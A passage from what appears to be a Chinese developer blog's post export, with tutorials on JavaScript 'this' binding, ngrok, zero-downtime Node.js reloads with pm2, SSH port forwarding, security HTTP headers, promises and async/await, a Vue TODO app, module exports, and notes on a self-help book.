a還有個方法可以確認說有沒有真的綁定到，可以透過 use strict 嚴格模式去做測試 123456function foo() { \"use strict\"; console.log(this.a);}var a = 2;foo(); // TypeError Implicit Binding (隱式綁定)這條隱式綁定的規則，則是要取決於上下文 12345678910function foo() { console.log(this.a);}var obj = { a: 2, foo: foo};var bar = obj.foo;var a = \"HIHI\"; // Globalbar(); // \"HIHI\" 雖然 bar 是 obj.foo 的一個引用，但實際上它是對應到 foo 上還有一種狀況很特別，當把 function 當成 args 傳進去執行 12345678910111213function foo() { console.log(this.a);}function doFoo(fn) { fn()}var obj = { a: 2, foo: foo};var bar = obj.foo;var a = \"HIHI\"; // GlobaldoFoo(obj.foo); // \"HIHI\" 這邊可以發現當把函數存進去後, obj.foo 的 this 是被綁定在 global 上 Explicit Binding (顯式綁定)顯式綁定會透過三個函數去使用call apply bind 的方式去做到這件事做法的話，前面應該有看到過了，這邊重新複習一下 1234567function foo() { console.log(this.a)}var obj = { a: 2};foo.call(obj); // 2 這邊可以注意到我們把 foo 裡面的 this.a 綁定到 obj 上面了 new Binding先說明 js 之中的 new 和其他 class 類型的語言是完全不一樣的東西在 js 之中使用 new，並不會真的屬於什麼類或是實例化一個類 (嚴格來說 js 中也沒有所謂的類，全部都是物件)而在使用 new 的時候會有以下幾個步驟 創建全新物件 新物件會被執行原型鏈的連接 新物件會綁定到函數調用的 this 如果函數沒有返回其他物件，那麼 new 會自動返回這個新物件，若有返回其他物件，則替換掉新物件 12345function foo(a) { this.a = a;}var bar = new foo(2);console.log(bar.a); // 2 以上的範例來說明上面的四個步驟bar 為 創建全新物件，建立出 bar 之後會對 Object 的原型鍊做連接 (這裡暫時不提)因為 bar 為新物件，所以根據新物件會綁定到函數調用的 this這時 bar 就會被綁定在 foo 函數裡面的 this 去了那因為在使用 new foo(2) 時，並沒有返回其他物件，所以這裡會把 bar 回傳回去但如果這時有返回其他物件，這時候就會把 bar 也改替換掉了這時第三步原本是把 this 綁定在 bar 本身，這時會變成綁定在其他物件身上參考以下 code 12345678910var test = { a: \"hihi\"}function foo(a) { this.a = a; return test;}var bar = new foo(2);console.log(bar.a); // \"hihi\" 不過如果回傳的並不是物件的話，狀況又會不一樣了 123456function foo(a) { this.a = a; return 1;}var bar = new foo(2);console.log(bar.a); // \"2\" 後記這是看完 You don’t know JS 後做的一篇整理如果有任何錯誤歡迎指教！而整本書對於 this 的解釋非常詳細，如果有興趣的讀者可以找找這本書看看原文是如何寫的吧！後續會再找時間整理關於 prototype (原形鏈) 的原理","link":"/2019/04/24/javascript-this/"},{"title":"Ngrok - Connect to your localhost!","text":"今天要介紹的是一個非常好用的東西，可以直接讓大家都連到你的 localhost這樣做完一個網站，你也不用特地部署，可以直接透過這個工具，大家都能連到 工具連結在此: Ngrok 使用方式簡單介紹下載下來後，unzip 之後就可以做使用了如果在 localhost 開了一個 8080 想讓大家連可以在下這以下這行指令 1./ngrok http 8080 結果會長這樣，然後在網址列打上他給你的網址就可以直接連到你的 8080 port 如果像是要用到 Apple Pay 一些特定服務只允許跑在 SSL 上面的話這個工具會非常有用，但畢竟是經過別人家重導 …. 所以小心用","link":"/2017/11/08/ngrok/"},{"title":"Node.js 如何實現 zero downtime 更新呢?","text":"前言工作久了，一定都會面臨到一個問題就是 Zero Downtime 更新 (零停機更新)簡單來說就是『我希望更新的時候，不會影響正在使用的客戶』這邊就紀錄如何去實現這需求 相信寫過 node.js 的人會知道在啟用伺服器的時候，如果重新修改程式要更新的時候，其實正在使用的客戶也會跟著斷線那究竟要如何達到 zero downtime 更新呢?我們來看看以下的 Cases，左邊是模擬伺服器，右邊則是模擬客戶端 Case 1在左邊可以看到，如果我要更新 a.js 的程式內容我必須要先按下 Ctrl + C 把 node.js 取消掉然後重新下 node a.js 才可以但取消的同時，右邊的客戶就會中斷，沒辦法繼續發送請求 Case 2接下來就有一個 pm2 誕生的時候pm2 是一個管理 Node.js process 的工具，很多 production 環境也有在使用這一套當 Node.js 出現錯誤的時候，pm2 會幫忙重啟 Node.js但如果沒用正確，依舊會導致客戶端中斷連線的可能性下面使用 pm2 把 Node.js 啟動，我使用 pm2 start a.js然後我要重新啟動 a.js 的時候，我使用了 pm2 restart a.js，依舊造成客戶斷線 Case 3-1接著就有透過 cluster 去解決這問題這個東西出現是為了解決 Node.js 沒辦法最大化利用電腦多核心的缺點假設電腦有四核心，透過 cluster 可以一次啟用 4 個 Node.js 的 process能接受的 request 量就會比只有 1 個 process 的時候還要更多在 pm2 裡面，是透過 pm2 start a.js -i max 的方式啟用最大核心數然後當程式修改的時候，可以透過 pm2 reload a.js 讓程式重起，但不會影響客戶斷線 Case 3-2但！就是這個但是萬一我們只有一個核心，也就是說只有一個 Node.js process 的時候我們去重新啟用的時候，依舊會發生讓客戶斷線的問題 中場補充要繼續往以下的 case 之前，要介紹在 http module 中有一個 close 的 function當呼叫 server.close(() =&gt; {console.log(&quot;server is closed&quot;)})express 會等到請求處理完事件後才會關閉 中場補充 case 01先來看第一個 case，左邊是我們的 server，右邊是我們客戶端我在 server 添加一個路由 /close，當 match 這個 get close 的時候，就會呼叫 close 流程是這樣當客戶呼叫 server 一個要等待兩秒的 api 時 (模擬高密集 CPU)我另外去呼叫 /close 是不會把目前使用者的請求中斷的而是會等到使用者 response 拿到後，才會關閉 server關閉後左邊 server 就會觸發 callback 印出 server is closed 中場補充 case 02剛剛的 case 是模擬高密集型 CPU接下來就會有一個疑問，network 的也會等到請求結束後才會關閉嗎?答案是：沒錯！ 左邊是我們的 server，中間是我們客戶端，右邊是另一個 api server 流程是這樣當客戶呼叫 server 時，此台 server 去呼叫 api server這台 api server 也是要處理兩秒的時間然後另外去呼叫 /close 是不會把目前使用者的請求中斷的而是會等到使用者 response 拿到後，才會關閉 server關閉後左邊 server 就會觸發 callback 印出 server is closed Case 4pm2 cluster 之後就接著出現 graceful relaod透過 pm2 官網的教程把下列這段程式碼加到程式裡面，詳細針對 SIGINT 的說明可以看 pm2 的 explanation-signals-flow然後再利用剛剛中場講到的 server.close() 的特性去等待處理完畢但總會有處理太久的狀況，此時也只能忍痛強制用 process.exit() 跳開此 case 就是一邊修改 server，修改完成後就直接更新可以看到右邊客戶端，拿到的結果也會跟著變，但卻不會造成客戶斷線！透過這種方式可以接近 zero downtime 更新123456789process.on('SIGINT', () =&gt; { console.log(\"start closing\") server.close(() =&gt; { // Stop after 10 secs setTimeout(() =&gt; { process.exit(); }, 10000); });}); Case 5但為何說接近呢？如果你的 Node.js 請求處理的時間，大於 setTimeout 的 10 秒的話，還是會造成客戶斷線但如果請求處理時間，全部都會遠小於這個時間，那就是真的 zero downtime 更新了那為了不要讓影片太久，我會把所有時間都調短請求處理: 5s客戶 timeout: 6s強迫程式關閉: 2s (setTimeout 的時間)pm2 option –kill-timeout: 3s這邊要特別記住，pm2 啟用的時候的 kill timeout 也需要設置 (不設置的話預設是 1.6s)如果不設置，最終還是以 pm2 kill timeout 為主，如果強迫程式關閉的時間，大於這個 kill timeout那麼強迫程式關閉的時間就形同虛設，因為最終還是會吃 kill timeout 的時間讓我們來看看以下的例子吧！(這個例子就沒有特別設置 kill timeout 而是用預設的) 後記影片中的程式碼，放在附錄可以自行去測試但記得要安裝 pm2 才可以使用 要達到 zero downtime 不是一件很簡單的事情還有的是透過 load balancer 後面接了兩台機器然後每一台機器輪流更新，這樣也能達到 zero downtime 更新 附錄 - 程式碼12345678910111213141516171819202122232425262728293031323334353637// a.jsconst http = require(\"http\");const express = require(\"express\")const app = express()app.use(express.static(__dirname + \"/public\"))app.post(\"/test\", (req, res) =&gt; { let counter = 0; for (let i = 0; i &lt; 100000000; i++) { counter+=1 } res.json({ counter })})const server = http.createServer(app)server.listen(3000, function() { console.log(\"server is up\")})process.on('SIGINT', () =&gt; { console.log(\"start closing\") server.close(() =&gt; { // Stop after 10 secs setTimeout(() =&gt; { process.exit(); }, 10000); }); // Force close server after 15 secs setTimeout((e) =&gt; { console.log('Forcing server close !!!', e); process.exit(1); }, 15000);}); 1234567891011121314151617// b.jsconst axios = require(\"axios\")async function main () { for (let i = 0; i &lt; 5000; i++ ) { let data = await axios.post(\"http://localhost:3000/test\", {}, { timeout: 10 * 1000 }).then((response) =&gt; { return response.data }) console.log(i) console.log(data) } console.log(\"done\")}main()","link":"/2020/03/09/nodejs-zero-downtime/"},{"title":"關於 SSH Tunnel 連線 (SSH Proxy, SSH Port Forwarding)","text":"這篇主要在介紹 SSH Tunnel 是什麼東西以及教學如何使用 使用情境介紹一般來說會使用到 SSH Tunnel 的其中一個情境會是這樣子的 這裡有兩台機器，分別為 A BB 為重要的服務或是資料A 為我們本身的主機，作為本地端開發時使用的 (開發會需要用到 B 的服務或是資料) 這時候我們總不能每一次在 A 把程式打完，就一次一次把程式放到 B 上面去跑這件事實在是太麻煩了（汗所以可以的話希望可以直接在 A 機器上面就能夠讀取到 B 的服務或是資料這樣的話就能夠方便直接在本地開發而要達成這件事情的方法就是透過 SSH Tunnel 的方式去達成 SSH Tunnel 介紹\bSSH Tunnel 在者裡面扮演的角色可以這樣思考 你在住家附近有一口水井，但你水井完全是沒有水可以取用然後在距離很遠的地方有一個水庫，要喝水的必須到水庫取水並放回住家附近的水井有一個作法就是，把水井和水庫之間挖一條通道，讓水庫的水直接導入到水井這個通道就是我們 SSH Tunnel 扮演的角色 而用比較技術的說法的話，SSH Tunnel 就是做到了 Port Forwarding 的功用 SSH Tunnel 使用方式這邊主要會是用 Linux 原生指令 ssh 去完成 SSH Tunnel在這之前我們先回想一下 ssh 連線的方式！ 當已經有一台 server 上面跑著一個網頁的服務而你可以透過以下指令 ssh 連線到那一台 server 上ssh root@127.0.0.1ssh 連線上去之後，上面有跑一個 Nginx 的服務在 80 port這時候在 server 上執行 curl localhost 會發現有成功回傳 Nginx 的 Hello 頁面 此時如果你想要在自己的電腦上就能讀取這個網頁或是資料庫該怎麼辦?這邊我們就要介紹 -L 這個 option 可以幫你達成這個目標！Template: ssh -L [local_port]:localhost:[remote_port] root@127.0.0.1 所以如果我要把 server 上的 80 port 網頁服務導入到本地端的 8080 port 該怎麼做呢?可以使用以下這行指令ssh -L 8080:localhost:80 root@127.0.0.1然後在瀏覽器打開 http://localhost:8080 即可看到 server 上面的網頁！ 接著又有另一種情境出現了就是在 server 上要讀取 local port 的服務的時候該怎麼辦呢?這裡就可以使用另一種相反的方式，也就是透過 -R 去達成-R 簡單來說就是反過來，你可以把本地機器上的服務 port 導入到 server 讓他連線！Template: ssh -R [remote_port]:localhsot:[local_port] root@127.0.0.1 舉例來說，在本地端起了一個 8080 port 的服務如果要在 server 上 6666 port 讀取的話可以透過以下方式取得！ssh -R 6666:localhost:8080 root@127.0.0.1 後記最近還蠻常會使用到這個方式去連線，於是在這邊特別把它記錄下來然而這種方式只是圖個方便，需要的時候做個 forwarding 而已","link":"/2019/01/08/ssh-tunnel/"},{"title":"增加安全性的 HTTP Headers","text":"最近遇到需要增進網站安全性的問題於是 survey 了幾個常見的 header 設置方式接下來會開始介紹每一個 header 的功能以及設置方式以及可以到這個網站進行檢測 https://securityheaders.io/個人習慣是用 nodejs + express，所以以下使用方式都會是以 express 為主 Set-Cookie 設置方式防禦面向為: XSS Set-Cookie 基本上是最多人使用的，但是 Set-Cookie 的設置方式如果沒有設定好是不安全的Set-Cookie 有以下兩個 header 可以設定 HttpOnly設置 HttpOnly 的 cookie 之後，會沒辦法用 document.cookie 的方式(任何 javascript)去存取 cookie Secure強制 cookie 只能在 HTTPS protocol 的環境下進行傳遞簡單來說設置 Secure 的 cookie 之後在非 HTTPS 的環境底下是會失效的 使用方式1234res.cookie('cookie_name', 'jack', { httpOnly: true, secure: true}) X-XSS-Protection防禦面向為: XSS 設定之後，如果瀏覽器偵測到 XSS 的攻擊，會根據設置的屬性做不同的反應p.s. 這個是舊有的屬性，基本上可以被 Content-Security-Policy 取代但是還是可以為那些沒有支援 Content-Security-Policy 的瀏覽器提供一層保護 X-XSS-Protection 有以下四個值可以設定 0關閉 XSS 過濾功能 1開啟 XSS 過濾功能，如果偵測到 XSS 攻擊的話，瀏覽器會刪除不安全的部分 1; mode=block開啟 XSS 過濾功能，如果偵測到 XSS 攻擊的話，瀏覽器不會把網頁給渲染出來 1;report= (Chromium only)開啟 XSS 過濾功能，如果偵測到 XSS 攻擊的話，瀏覽器會回報到指定的 URI 使用方式1234res.setHeader('X-XSS-Protection', '0')res.setHeader('X-XSS-Protection', '1')res.setHeader('X-XSS-Protection', '1; mode=block')res.setHeader('X-XSS-Protection', '1;report=https://www.example.com') Content-Security-Policy防禦面向為: XSS Content-Security-Policy 是一個可以限制網站的 script object style font 的來源主要是用白名單的方式限制，甚至可以限制不允許 eval 這種東西出現簡單來說設定 Content-Security-Policy 之後，只有白名單內的 resource 可以存取因為值很多種，所以以下用例子來解釋，詳細可以參考 Content-Security-Policy但基本上有以下幾種可以設定 default-src script-src img-src font-src frame-src 1res.setHeader('Content-Security-Policy', \"default-src 'self'; script-src 'self' *.google.com 'unsafe-eval'; img-src 'self' *.amazonaws.com data:\") 以上面的例子來說default-src ‘self’ 代表網站 resource 只能讀取自己網站的，default 代表如果在其他設置欄位沒找到的話，會根據 default-src 為主script-src ‘self’ .google.com ‘unsafe-eval’ 代表我用的 script src 可以存取自己網站以及 .google.com 底下，以及可以允許 evalimg-src ‘self’ .amazonaws.com data:代表我用的 script src 可以存取自己網站以及 .amazonaws.com 底下，以及比較特別的是可以存取 base64 格式的 image data X-Frame-Options防禦面向為: Clickjacking X-Frame-Options 主要是設定網站是否能被其他網站透過 iframe frame 的方式遷入X-Frame-Options 有以下三個值可以設定 DENY不允許被任何網站用 iframe 的形式嵌入的假設在 www.example.com 設置了 X-Frame-Options: DENY 的話在 www.google.com 的話，是不能 html 裡面嵌入 &lt;iframe src=&quot;www.example.com&quot;&gt;&lt;/iframe&gt; SAMEORIGIN允許同源底下的網站，用 iframe 方式嵌入 ALLOW-FROM設定白名單的 list 使用方式123res.setHeader('X-Frame-Options', 'DENY')res.setHeader('X-Frame-Options', 'SAMEORIGIN')res.setHeader('X-Frame-Options', 'ALLOW-FROM https://example.com') X-Content-Type-Options用途: 避免瀏覽器誤判文件形態 X-Content-Type-Options 是拿來防止 Content-Type 被竄改比較要注意的是，這個屬性只會套用在 script style如果 style 的 content-type 不是 text/css 就會被拒絕如果 script 的 content-type 不是 javascript MIME type 就會被拒絕 使用方式1res.setHeader('X-Content-Type-Options', 'nosniff') Strict-Transport-Security防禦面向: 強迫用戶使用 HTTPS，防範 MITM 攻擊 Strict-Transport-Security 是強化 HTTPS 機智的一種方式設置之後，即使是用 HTTP 連線，還是會被轉去使用 HTTPS 連線 使用方式1res.setHeader('Strict-Transport-Security', 'max-age=16070400; includeSubDomains') Referrer-Policy防禦面向: 增加隱私權 Referrer 代表的是你從 A 網站跳到 B 網站的時候，這個欄位會被記錄為 A簡單來說，他是記錄你上一個瀏覽的地方的東西 他有以下幾個值可以設定，詳細可以參考這裏 no-referrer不允許被記錄下來 origin只有紀錄 origin，例如在 https://example.com/a.html 底下，只會傳送 https://example.com strict-origin只有在 HTTPS-&gt;HTTPS 之間才會被記錄下來 no-referrer-when-downgrade (default)跟 strict-origin 一樣 origin-when-cross-origin只有在 CORS 的時候, referrer 才會被送出，但只有 origin same-originCORS 的時候, referrer 不會被記錄，同源的時候會有 origin strict-origin-when-cross-origin只有在同源的時候才會送出 referrer，而且還是要 HTTPS -&gt; HTTPS unsafe-url不管怎樣都送就對拉 使用方式12res.setHeader('Referrer-Policy', 'no-referrer')res.setHeader('Referrer-Policy', 'unsafe-url') Public-Key-Pins防禦面向: 中間人攻擊 設定 Public-Key-Pins 之後，可以給予我們是否要主動信任 CA (憑證頒發機構) 的權利可以防止攻擊者透過 CA 錯誤的簽署憑證並進行中間人攻擊的安全機制 使用方式1234// 裡面的 base64== 是要透過用自己的憑證，產出的 public keu// 產出的 public key 配合 openssl 產出 fingerprint// 把 fingerprint 貼上來取代掉 base64== 即可res.setHeader('Public-Key-Pins', 'pin-sha256=\"base64==\"; max-age=2592000; includeSubDomains') Referencehttps://developer.mozilla.orghttps://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/","link":"/2017/10/20/secure-header/"},{"title":"callback, promise, async/await 使用方式教學以及介紹 Part I","text":"[Update 2019-05-02] 關於 Error Handing 可以看下一篇文章 這篇主要紀錄 callback, promise, async/await 的使用方式以及如何從到 callback 和 promise 的 hell world 進入到 async/await 這兩兄弟的世界建議閱讀的人要有 Javascript 的基礎概念，包括對 non-blocking, event-driven 的觀念有一些涉略 CallbackCallback 是 JS 很常用的一種使用方式簡單來說，就是把 function 當作參數傳進去使用以下是簡單的使用範例123456789101112function test() { console.log(\"This test function is done.\")}function main(callback) { console.log(\"This is main start.\") callback() console.log(\"This is main end.\")}main(test)// This is main start.// This test function is done.// This is main end. 但是 callback 使用上往往沒那麼簡單，基本上都會牽扯到 API 相關的用法所以會變成下面這樣的方式12345678910111213141516function test() { // 這邊模擬 test 這個 function 去 call 其他 API 要等待的情況 // 等了一秒後才會執行 console.log 這個函式 setTimeout(()=&gt; { console.log(\"This test function is done.\") }, 1000)}function main(callback) { console.log(\"This is main start.\") callback() console.log(\"This is main end.\")}main(test)// This is main start.// This is main end.// This test function is done. 這邊會發現，This is main end. 反而先執行印出來了, 這裡牽扯到 non-blocking 的概念, 將會放在別的章節重新介紹那如果我想要 This is main end. 在最下面的話該怎麼做呢?做法上只要把執行 This is main end. 的函示也當成 callback 傳進去就可以按照順序執行下來了123456789101112131415161718function test(callback2) { // 這邊模擬 test 這個 function 去 call 其他 API 要等待的情況 // 等了一秒後才會執行 console.log 這個函式 setTimeout(() =&gt; { console.log(\"This test function is done.\") callback2() }, 1000)}function main(callback) { console.log(\"This is main start.\") callback(() =&gt; { console.log(\"This is main end.\") })}main(test)// This is main start.// This test function is done.// This is main end. 用 callback 解決的非同步的問題, 但是當越來越多 callback 串再一起就會變成 callback hell, 如同下面這樣12345678910111213141516171819202122232425function api1(callback) { setTimeout(() =&gt; { console.log(\"Done with api1\") callback() }, 2000)}function api2(callback) { setTimeout(() =&gt; { console.log(\"Done with api2\") callback() }, 1000)}function main(callback) { api1(() =&gt; { api2(() =&gt; { callback() }) })}main(() =&gt; { console.log(\"All function is done.\")})// \"Done with api1\"// \"Done with api2\"// \"All function is done.\" 當越來越多 API 要按照順序做下去的時候就會很恐怖了，會變成這樣123456789api1(() =&gt; { api2(() =&gt; { api3(() =&gt; { api4(() =&gt; { // bla bla bla }) }) })}) Promise介紹完 callback 之後，一定要介紹他的好兄弟 PromisePromise 是一個可以對非同步進行處理以及進行各種操作的東西通常 Promise 會包含三種狀態 resolve reject pendingresolve 代表成功 rejetc 代表失敗, pending 代表還在處理中, 結束狀態未知以下有兩種方式得知結果resolve 會觸發 onSuccessful, reject 會觸發 onFailedpromise.then(onSuccessful, onFailed)promise.then(onSuccessful).catch(onFailed)以下是 Promise 的使用範例123456789101112131415161718192021222324function test(number) { return new Promise((resolve, reject) =&gt; { if (number === 1) { resolve(\"Success\") } else { reject(\"Failed\") } })}function main() { test(1).then((result) =&gt; { // result === \"Success\" console.log(result) }).catch((error) =&gt; { // 不會被執行, 因為狀態是成功 }) test(2).then((result) =&gt; { // 不會被執行, 因為狀態是成功 console.log(result) }).catch((error) =&gt; { // error === \"Failed\" console.log(error) })} Promise 的基本介紹完之後，一定都會提到一個 Promise Chain 的概念簡單來說就是我可以一直 then 下去，直到海枯石爛, 只要我在 resolve 或是 reject 的狀態下，return 任何東西都可以 then 下去12345678910111213141516171819202122232425262728293031function test(number) { return new Promise((resolve, reject) =&gt; { if (number === 1) { resolve(\"Success\") } else { reject(\"Failed\") } })}function main() { test(1).then((result) =&gt; { // result === \"Success\" console.log(result) // return \"Next One\" return test(1) }).then((result) =&gt; { // result === \"Next One\" console.log(result) })}function main2() { test(2).then((result) =&gt; { // result === \"Success\" console.log(result) // return Promise 的物件也是可以的喔 return test(1) }).then((result) =&gt; { // result === \"Success\" console.log(result) })} 但是按照這樣的寫法下去, 又會變成另一種 then hell 的概念於是接下來出現了 async/await 這兩兄弟 async/awaitasync/await 基本上是一種語法糖, 把 Promise 的重新包裝起來然後做使用可以不用再透過 then 的方式去執行 Promise使用方式會變成以下這樣123456789101112131415function test(number) { return new Promise((resolve, reject) =&gt; { if (number === 1) { resolve(\"Success\") } else { reject(\"Failed\") } })}async function main() { var result = await test(1) // result === \"Success\" console.log(result)}main() 記得在使用 await 的時候, function 前面一定要加上 async所以當我有很多 API 要使用的話, 就會變得很乾淨12345async function main() { let result1 = await test1() let result2 = await test2() let result3 = await test3()} 結語這 Part 主要是快速介紹使用教學方式下一部分會介紹在這三種使用方式裡面是如何做到 Error Handling","link":"/2018/07/22/promise/"},{"title":"TODO - vue + vuex + vue-router","text":"這篇文章主要在記錄如何用 vue + vuex + vue-router做出一個簡單的 TODO List 專案DEMO 網站Source Code 先來訂一個 TODO List 的簡單需求表 能夠輸入項目 能夠打勾確認完成 能夠刪除項目 能夠選擇顯示全部, 未完成, 完成的項目 程式部分則會分為一個 vuex store 和三個 components 專門控管資料的 store 輸入項目 component 顯示項目 compoent 選擇完成狀態的 component 專門控管資料的 storestore.js12345678910111213141516171819202122232425262728293031import Vue from 'vue';import Vuex from 'vuex';Vue.use(Vuex)const store = new Vuex.Store({ state: { lists: [], status: '', // 去更新要顯示什麼狀態的項目 counter: 0 // 當作 increment id 用 }, // 宣告可以更改的方式 mutations: { addItem (state, new_item) { state.counter += 1 new_item.id = state.counter state.lists.push(new_item) }, changeStatus(state, id) { state.lists = state.lists.map((list) =&gt; { if (list.id === id) list.is_completed = !list.is_completed return list }) }, deleteItem(state, id) { state.lists = state.lists.filter((list) =&gt; { if (list.id === id) return false; return true; }) } }})export default store; 輸入項目 componenttodo-input.vue12345678&lt;div&gt; &lt;form class=\"ui form\" @submit.prevent=\"submit\"&gt; &lt;div class=\"field\"&gt; &lt;label for=\"\"&gt;List&lt;/label&gt; &lt;input type=\"text\" v-model=\"item\"&gt; &lt;/div&gt; &lt;/form&gt;&lt;/div&gt; 12345678910111213141516export default { data() { return { item: '' } }, methods: { submit() { this.$store.commit('addItem', { name: this.item, is_completed: false }) this.item = '' } }} 顯示項目 componenttodo-item.vue1234567891011121314151617181920212223242526272829303132&lt;div&gt; &lt;table class=\"ui table stackable fixed\"&gt; &lt;thead&gt; &lt;tr&gt; &lt;th colspan=\"3\"&gt;Item&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr v-for=\"(list, index) in lists\"&gt; &lt;td :class=\"{completed: list.is_completed}\"&gt; {{list.name}} &lt;/td&gt; &lt;td&gt; &lt;!-- 綁定 done method, 並傳入 id 去做勾選完成--&gt; &lt;button class=\"ui icon inverted green button\" @click=\"done(list.id)\"&gt; &lt;i v-if=\"list.is_completed === false\" class=\"checkmark icon\"&gt;&lt;/i&gt; &lt;i v-else class=\"reply icon\"&gt;&lt;/i&gt; &lt;/button&gt; &lt;/td&gt; &lt;td&gt; &lt;!-- 綁定 remove method, 並傳入 id 去做刪除 --&gt; &lt;button class=\"ui icon inverted red button\" @click=\"remove(list.id)\"&gt; &lt;i class=\"trash icon\"&gt;&lt;/i&gt; &lt;/button&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt;&lt;/div&gt;&lt;style scoped lang=\"css\"&gt;.completed { text-decoration: line-through}&lt;/style&gt; 123456789101112131415161718export default { computed: { status () { return this.$store.state.status }, lists() { return this.$store.getters.filtered_list } }, methods: { remove(id) { this.$store.commit('deleteItem', id) }, done(id) { this.$store.commit('changeStatus', id) } }} 選擇完成狀態的 coomponenttodo-display.vue1234567&lt;div&gt; &lt;select class=\"ui dropdown\" v-model=\"status\"&gt; &lt;option value=\"\"&gt;Show All&lt;/option&gt; &lt;option value=\"done\" selected&gt;Show Done&lt;/option&gt; &lt;option value=\"nondone\"&gt;Show None-done&lt;/option&gt; &lt;/select&gt;&lt;/div&gt; 123456789101112export default { computed: { status: { get () { return this.$store.state.status }, set (value) { this.$store.commit('setFilter', value) } } }}","link":"/2017/09/23/todo-vue/"},{"title":"Module Export","text":"稍微紀錄一下在 nodejs 裡面 module.exports 和 require以及在 ECMA6 的 export 和 import 的使用方式 nodejs首先先在 a.js 裡面 export 出一個 object 裡面包含一個 click function然後再 b.js 裡面用 require a.js，這時候會有兩種使用方式 1234567891011121314151617// a.jsmodule.exports = { click: () =&gt; { console.log('Hi') }}// b.js// 第一種const a = require('./a.js')a.click()// Hi// 第二種const {click} = require('./a.js')click()// Hi 另外一種使用方式也可以達到同樣效果 1234567891011121314151617181920// a.jsmodule.exports = () =&gt; { // 這裡可以處理一些初始化的東西 return { click: () =&gt; { console.log('Hi') } }}// b.js// 第一種const a = require('./a.js')()a.click()// Hi// 第二種const {click} = require('./a.js')()click()// Hi 接下來就用不同種例子，看看使用方式 1234567// a.jsmodule.exports = [1, 2, 3]// b.jsconst a = require('./a.js')console.log(a)// [1, 2, 3] 123456789// a.jsmodule.exports = { name: 'Hi'}// b.jsconst a = require('./a.js')console.log(a.name);// Hi ECMA6我把上面的例子轉換成 ECMA6 import 和 export 的方式但是有些地方會有些許不同 1234567891011// a.jsexport default { click: () =&gt; { console.log('Hi') }}// b.jsimport a from './a.js'a.click()// Hi 123456789101112// a.jsconst click = () =&gt; { console.log('Hi')}export { click}// b.jsimport {click} from './a.js'click()// Hi 也可以搭配 as 和 * 去做 import (無法跟 export default 做搭配) 123456789101112// a.jsconst click = () =&gt; { console.log('Hi')}export { click}// b.jsimport * as a from './a.js'a.click()// Hi 接下來就用不同種例子，看看使用方式 1234567// a.jsexport default [1, 2, 3]// b.jsimport a from './a.js'console.log(a);// [1, 2, 3] 12345678910// a.jsconst a = [1, 2, 3]export { a}// b.jsimport {a} from './a.js'console.log(a);// [1, 2, 3] 1234567891011121314// a.jsexport default { name: 'hi'}// 等同於const a = { name: 'hi'}export default a// b.jsimport a from './a.js'console.log(a.name);// Hi","link":"/2017/10/19/module-export/"},{"title":"別人怎麼對你，都是你教的 - part 1","text":"最近除了學習自身技術能力以外，也需要提升自己內心的能力最近看到一本書叫做『別人怎麼對你，都是你教的』裡面舉了相當多的例子讓你去了解心理學的概念，相當推薦這本書接下來幾篇會紀錄書中的金句和例子，但不會全部介紹 情緒書中提到關於十二種情緒，但都脫離不了一項原則 情緒只是一種能量，沒有好壞之分每一種情緒都有它獨特的價值、功能、存在的理由，都是我們可以利用的力量沒有所謂的負面情緒，只有情緒帶來的負面行為面對情緒時，要看到並接納情緒背後的真實表達 除了要看到接納情緒之外還要懂得如何運用這情緒帶來的意義先來看看書中如何說明面對『羨慕』以及『嫉妒』以及『焦慮』這三種情緒 羨慕與嫉妒羨慕是看到別人擁有的，自己也希望擁有嫉妒程度更深，看到別人擁有的，恨不得對方失去，藉來平衡自己的內心 要成為一座城市中最高的大樓有兩種方法一種是摧毀所有比自己高的大樓; 另一種就是打好基礎，不斷努力往上建前者是『嫉妒』後者是『羨慕』，這樣聽起來羨慕比較正向但兩者都有一個共通點，也就是對自我價值不足的體現 當了解了這兩種情緒之後，當未來發生希望摧毀其他大樓的情況時可以把這個嫉妒換成羨慕，但即使換成羨慕也是因為覺得自己不夠好這時要時時刻刻提醒自己，不是自己不夠好，而是自己還可以變得更好 焦慮焦慮常常發生在，未來幾天要上台報告或是要口試等等重大事情發生之前很多緊張會導致消耗我們的能量，書中提到一句話 未來還沒來，因此焦慮會一直存在，不斷消耗我們生命中的能量 但只要你覺察到感到焦慮的時候，試著把焦點拉回當下問問自己：面對未來可能的威脅我能怎麼辦? 我現在可以做些什麼，來減少未來可能的損失呢?於是你的焦點就拉回到解決方案上，而不是把精力虛耗在無謂的擔心上 大多數人所擔心的未來，都是不一定真的會發生的事情很多都是大腦自己憑空想像出來的 自信我們常會看到別人充滿自信，但你知道這個自信有分成兩種嗎? 大眾所說的自信其實分為兩種一種是建立在自己所做的某件事上的自信，隨著外在事物消失，自信也會分崩離析一種是對自己這個人的自己，也就是自己發自內心地相信自己，不受任何外在事物影響 第一個例子是作者有一位朋友，少年得志，好像沒有他辦不成的是，所有難題到了他那裡會迎刃而解後來當上市長，但因為一件突發事件，被抓去坐牢釋放之後，整個人就像人間蒸發一樣，誰都找不到他，他也不願再見當初的朋友 第二個例子是作者另一位朋友，在商界打拼多年，也曾經遭遇過一次滑鐵盧當時，大家都聽挺擔心他，生怕他想不開，於是作者試圖安慰他他笑了笑說:我只是暫時投資失利而已，只要生命還在，一切都可以從頭再來不同的事，以前坐頭等艙，現在做火車，我的生活方式改變了，但我還是我，並沒有什麼改變 真正的自信，只能向內修煉書中提到，自大並不是自信過度，相反地還是自我價值不足的外在表現而要如何面對這種自大，可以問問自己幾個問題 我的價值真的需要這些外物去證明嗎?如果有一天我不再擁有目前擁有的，我還能為自己感到驕傲嗎?如果要依賴這些外物才能驕傲，那我真正的價值在哪裡呢? 關係書中提到十種關係在這一篇先介紹關於溝通這件事情 溝通有個讀者留言給作者說了這樣的事情 我們公司的主管非常固執、獨斷，聽不進任何建議採用狼性管理模式來管理我們，一點都不理會員工的死活我到底要怎麼跟主管溝通 相信大家都有遇過聽不進你的話的人，導致溝通無法繼續但真的有那種無法溝通的人嗎? 先來看看一種例子一個孩子考試考了九十分父母卻說：『為什麼不是一百分? 這麼粗心，連這種簡單題目也做錯，太差勁了吧』站在孩子的角度，九十分已經是不錯的成績了，沒想到換來是一連串批評，孩子會有何感受? 